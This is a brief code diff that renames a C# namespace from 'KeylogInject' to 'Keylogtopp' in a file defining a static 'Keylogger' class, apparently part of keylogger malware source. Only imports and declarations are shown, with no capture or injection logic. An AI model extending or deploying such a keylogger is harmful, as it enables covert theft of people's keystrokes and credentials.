@@ -2,10 +2,10 @@
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Text;
-using static KeylogInject.Native;
-using static KeylogInject.Delegates;
+using static Keylogtopp.Native;
+using static Keylogtopp.Delegates;
 
-namespace KeylogInject
+namespace Keylogtopp
 {
     public static class Keylogger
     {
